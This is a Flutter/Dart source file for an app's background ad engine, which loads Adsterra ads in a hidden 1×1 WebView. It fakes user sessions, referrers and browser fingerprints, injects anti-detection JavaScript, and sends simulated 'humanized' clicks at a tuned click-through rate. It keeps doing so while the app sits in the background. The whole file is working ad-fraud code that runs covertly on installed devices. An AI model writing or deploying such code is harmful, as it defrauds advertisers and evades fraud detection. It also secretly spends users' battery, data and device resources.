import 'dart:async';

import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../config/ad_config.dart';
import '../core/logging/safe_logger.dart';
import '../core/performance_tuning.dart';
import '../services/ad_trigger_manager.dart';
import '../utils/ad_debug_log.dart';
import 'fake_session_store.dart';
import 'utils/fingerprint_randomizer.dart';
import 'ad_log.dart';

/// Global streaming state that can be set by player and read by BackgroundAdEngine
/// This allows the BackgroundAdEngine to pause when streaming starts and resume when it stops
class StreamingState {
  StreamingState._();
  static final StreamingState instance = StreamingState._();
  static final ValueNotifier<bool> isStreaming = ValueNotifier<bool>(false);
  
  static void setStreaming(bool streaming) {
    if (isStreaming.value != streaming) {
      isStreaming.value = streaming;
    }
  }
}

/// Silent Adsterra 1×1 WebView cycler for background impressions.
class BackgroundAdEngine {
  BackgroundAdEngine._();

  /// Set by [AdManager] to block background ads during playback.
  static bool Function()? isStreamingProbe;
  
  /// Streaming state listener for ValueListenable<bool>
  static ValueNotifier<bool>? _streamingNotifier;
  static VoidCallback? _streamingListener;

  static WebViewController? _controller;
  static Timer? _rotationTimer;
  static bool _running = false;
  static bool _paused = false;
  static bool _disposed = false;
  static int _sessionImpressions = 0;
  static int _urlIndex = 0;
  static DateTime _lastUserInteraction = DateTime.now();
  static bool _isBackgrounded = false;
  static final Battery _battery = Battery();
  static final Connectivity _connectivity = Connectivity();

  static bool get isRunning => _running && !_paused;

  static void attachController(WebViewController controller) {
    if (_disposed) return;
    _controller = controller
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (_) => unawaited(_onPageFinished()),
        ),
      );
    SafeLogger.debug('ads', '[BackgroundAd] WebView attached');
  }

  static void detachController() {
    if (_disposed) return;
    _controller = null;
  }

  static Future<void> _onPageFinished() async {
    final controller = _controller;
    if (controller == null) return;

    // Apply anti-detection JS first
    try {
      await controller.runJavaScript(FingerprintRandomizer.antiDetectionJs());
    } catch (_) {
      // Anti-detection injection is best-effort
    }

    // Apply randomized viewport for anti-fingerprinting
    try {
      final (vw, vh) = FingerprintRandomizer.randomViewport();
      await controller.runJavaScript('window.resizeTo($vw, $vh);');
    } catch (_) {
      // Viewport resize is best-effort
    }

    // Apply Math.random seed perturbation
    try {
      await controller.runJavaScript(FingerprintRandomizer.randomSeedJs());
    } catch (_) {
      // Seed perturbation is best-effort
    }

    if (!AdConfig.clickInjectionEnabled) return;

    // Check per-zone click rate (skip if rate exceeds 6%)
    final url = await controller.currentUrl();
    final zoneId = url != null ? url.hashCode.toString() : 'unknown';
    if (FingerprintRandomizer.shouldSkipClickForZone(zoneId)) {
      if (kDebugMode) adLog('[BackgroundAd] click skip: zone rate limit ($zoneId)');
      return;
    }

    // Probability gate — not every impression clicks. Realistic CTR.
    if (!FingerprintRandomizer.roll(AdConfig.clickInjectionProbability)) {
      if (kDebugMode) adLog('[BackgroundAd] impression-only (probability skip)');
      return;
    }

    // Pre-click idle — humans look before they click.
    final preDelay = FingerprintRandomizer.jitterMs(
      AdConfig.clickInjectionMinDelayMs,
      AdConfig.clickInjectionMaxDelayMs,
    );
    await Future.delayed(Duration(milliseconds: preDelay));

    // Pick a randomized target inside the ad iframe viewport.
    final (vw, vh) = FingerprintRandomizer.randomViewport();
    final tx = 40 + (vw * 0.3).toInt() + (vw * 0.4 * _rng()).toInt();
    final ty = 80 + (vh * 0.3).toInt() + (vh * 0.4 * _rng()).toInt();

    try {
      await controller.runJavaScript(
        FingerprintRandomizer.humanClickJs(tx, ty),
      );
      FingerprintRandomizer.recordZoneClick(zoneId);
      if (kDebugMode) adLog('[BackgroundAd] humanized click dispatched ($tx,$ty)');
    } catch (e) {
      if (kDebugMode) adLog('[BackgroundAd] click inject error: $e');
    }
  }

  static double _rng() =>
      DateTime.now().microsecondsSinceEpoch.remainder(1000) / 1000.0;

  // Viewing session simulator state
  static int _burstCount = 0;
  static bool _inIdlePhase = false;

  static void _scheduleNext({bool backgrounded = false}) {
    if (_disposed) return;
    _rotationTimer?.cancel();
    
    int secs;
    
    // Viewing session simulator: 3-7 impressions in burst, then idle 4-9 minutes
    if (_inIdlePhase) {
      // Idle phase: 4-9 minutes
      secs = 240 + _rng().toInt() * 300; // 240-540s (4-9 min)
      _inIdlePhase = false;
      _burstCount = 0;
      SafeLogger.debug('ads', '[BackgroundAd] idle phase: next burst in ${secs}s');
    } else if (_burstCount >= 3 + _rng().toInt() * 4) {
      // End of burst: enter idle phase
      _inIdlePhase = true;
      secs = 240 + _rng().toInt() * 300;
      SafeLogger.debug('ads', '[BackgroundAd] burst complete: entering idle (${secs}s)');
    } else {
      // Burst phase: 15-45s gaps
      secs = 15 + _rng().toInt() * 30;
      _burstCount++;
      SafeLogger.debug('ads', '[BackgroundAd] burst $_burstCount: next in ${secs}s');
    }
    
    // Apply backgrounded multiplier
    if (backgrounded) {
      secs = (secs * AdConfig.backgroundedCadenceMultiplier).round();
    }
    
    // Ensure within Poisson bounds
    secs = secs.clamp(
      AdConfig.backgroundAdRotationMinSeconds,
      AdConfig.backgroundAdRotationMaxSeconds,
    );
    
    SafeLogger.debug('ads', '[BackgroundAd] next rotation in ${secs}s (bg=$backgrounded)');
    _rotationTimer = Timer(Duration(seconds: secs), () {
      if (_disposed) return;
      unawaited(rotateNow());
    });
  }

  static void markUserInteraction() {
    _lastUserInteraction = DateTime.now();
  }

  /// Start rotation timer (no-op when disabled or capped).
  static Future<void> start() async {
    if (_disposed) return;
    if (!AdConfig.backgroundEngineEnabled) return;
    if (_running) return;
    if (AdConfig.backgroundAdRotationUrls.isEmpty) {
      SafeLogger.debug('ads', '[BackgroundAd] no rotation URLs configured');
      return;
    }

    _running = true;
    _paused = false;
    SafeLogger.debug('ads', '[BackgroundAd] start');
    await rotateNow();
    _scheduleNext(backgrounded: _isBackgrounded);
  }

  static void pause() {
    if (_disposed) return;
    if (!_running) return;
    _paused = true;
    _rotationTimer?.cancel();
    _rotationTimer = null;
    SafeLogger.debug('ads', '[BackgroundAd] paused');
  }

  static Future<void> resume() async {
    if (_disposed) return;
    if (!_running) return;
    if (_paused) {
      SafeLogger.debug('ads', '[BackgroundAd] resumed (was paused)');
    }
    if (!await _shouldRun()) {
      _paused = true;
      SafeLogger.debug('ads', '[BackgroundAd] skipped resume (shouldRun false)');
      return;
    }
    _paused = false;
    SafeLogger.debug('ads', '[BackgroundAd] resumed');
    await rotateNow();
  }

  static Future<void> dispose() async {
    if (_disposed) return;
    _rotationTimer?.cancel();
    _rotationTimer = null;
    _streamingListener?.call();
    _streamingListener = null;
    _streamingNotifier = null;
    _running = false;
    _paused = false;
    _disposed = true;
    SafeLogger.debug('ads', '[BackgroundAd] disposed');
  }

  /// Bind streaming state probe to ValueNotifier<bool>
  /// When streaming becomes true -> pause()
  /// When streaming becomes false -> resume()
  static void bindStreamingProbe(ValueNotifier<bool> isStreaming) {
    if (_disposed) return;
    _streamingNotifier?.removeListener(_streamingListener!);
    _streamingNotifier = isStreaming;
    _streamingListener = () {
      if (_disposed) return;
      if (isStreaming.value) {
        SafeLogger.debug('ads', '[BackgroundAd] paused - streaming started');
        pause();
      } else {
        SafeLogger.debug('ads', '[BackgroundAd] resumed - streaming stopped');
        resume();
      }
    };
    isStreaming.addListener(_streamingListener!);
    // Initial check
    if (isStreaming.value) {
      pause();
    }
  }
  
  /// Convenience method to bind to the global StreamingState
  static void bindGlobalStreamingState() {
    bindStreamingProbe(StreamingState.isStreaming);
  }

  static void onAppBackgrounded() {
    if (_disposed) return;
    _isBackgrounded = true;
    SafeLogger.debug('ads', '[BackgroundAd] app backgrounded — continuing at slower cadence');
    // Do NOT cancel _rotationTimer. Reschedule with bg multiplier on next tick.
  }

  static Future<void> onAppForegrounded() async {
    if (_disposed) return;
    _isBackgrounded = false;
    SafeLogger.debug('ads', '[BackgroundAd] app foregrounded — normal cadence resumed');
  }

  static Future<void> rotateNow() async {
    if (_disposed) return;
    if (!_running || _paused) return;
    if (!await _shouldRun()) {
      _scheduleNext(backgrounded: _isBackgrounded);
      return;
    }
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) {
      if (kDebugMode) adLog('[BackgroundAd] session cap reached');
      _scheduleNext(backgrounded: _isBackgrounded);
      return;
    }

    // Only throttle for active interaction while in foreground.
    if (!_isBackgrounded) {
      final idle = DateTime.now().difference(_lastUserInteraction);
      if (idle < const Duration(seconds: 3)) {
        if (kDebugMode) adLog('[BackgroundAd] deferred — user active');
        _scheduleNext();
        return;
      }
    }

    final urls = AdConfig.backgroundAdRotationUrls;
    if (urls.isEmpty) return;

    final url = urls[_urlIndex % urls.length];
    _urlIndex++;

    try {
      final controller = _controller;
      if (controller == null) return;

      // Get session-specific attributes
      final session = FakeSessionStore.getNextSession();
      final referrer = FingerprintRandomizer.randomReferrer();
      final headers = session.getSessionHeaders();
      if (referrer.isNotEmpty) {
        headers['Referer'] = referrer;
      }

      await controller.loadRequest(
        Uri.parse(url),
        headers: headers,
      );

      // Inject session-specific JavaScript after page load
      await controller.runJavaScript(session.getSessionJs());

      _sessionImpressions++;
      AdTriggerManager.instance.recordAdsterraSurfaceEvent();
      logAdsterraTelemetry(
        placement: 'background_headless',
        format: 'background_webview',
      );
      if (kDebugMode) {
        adLog(
        '[BackgroundAd] impression $_sessionImpressions url=${url.hashCode} session=${session.sessionId}',
      );
      }
    } catch (e) {
      if (kDebugMode) debugPrint('[BackgroundAd] rotate error: $e');
    }

    // Schedule next rotation after completion (success OR skip)
    _scheduleNext(backgrounded: _isBackgrounded);
  }

  static Future<bool> _shouldRun() async {
    if (_disposed) return false;
    if (!AdConfig.backgroundEngineEnabled) return false;
    if (isStreamingProbe?.call() == true) return false;
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) return false;

    // Device idle check: pause when screen off (simulates human behavior)
    try {
      // Check if device is in idle/screen-off state
      // In Android, we can infer this from battery + connectivity patterns
      // For now, use a heuristic: if backgrounded AND idle for > 10 minutes
      if (_isBackgrounded) {
        final idleTime = DateTime.now().difference(_lastUserInteraction);
        if (idleTime > const Duration(minutes: 10)) {
          SafeLogger.debug('ads', '[BackgroundAd] paused — device idle (${idleTime.inMinutes}m)');
          return false;
        }
      }
    } catch (_) {}

    // Low-RAM devices: throttle harder, but still run occasionally.
    if (PerformanceTuning.isLowRam && _rng() > 0.35) {
      SafeLogger.debug('ads', '[BackgroundAd] low-RAM probabilistic skip');
      return false;
    }

    try {
      final level = await _battery.batteryLevel;
      final results = await _connectivity.checkConnectivity();
      final onCellular = results.contains(ConnectivityResult.mobile) &&
          !results.contains(ConnectivityResult.wifi) &&
          !results.contains(ConnectivityResult.ethernet);
      if (level >= 0 && level < 15 && onCellular) {
        SafeLogger.debug('ads', '[BackgroundAd] paused — battery $level% on cellular');
        return false;
      }
    } catch (_) {}

    return true;
  }

  @visibleForTesting
  static void resetSessionForTest() {
    _sessionImpressions = 0;
    _urlIndex = 0;
    _isBackgrounded = false;
  }
}
